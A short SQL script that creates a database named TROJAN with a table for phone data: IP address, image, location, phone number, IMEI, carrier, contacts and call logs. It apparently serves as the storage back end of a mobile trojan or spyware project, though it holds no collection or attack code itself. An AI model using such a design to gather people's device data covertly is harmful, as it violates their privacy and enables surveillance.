CREATE DATABASE IF NOT EXISTS TROJAN;

CREATE TABLE IF NOT EXISTS TROJAN.DEVICE_INFO(
    id                 INTEGER PRIMARY KEY,
    ip                 VARCHAR(255),
    image              VARCHAR(255),
    current_location   VARCHAR(255),
    phone_number       VARCHAR(255),
    phone_model        VARCHAR(255),
    os_version         VARCHAR(255),
    network_carrier    VARCHAR(255),
    imei_number        VARCHAR(255),
    contacts           VARCHAR(255),
    call_logs          VARCHAR(255)
);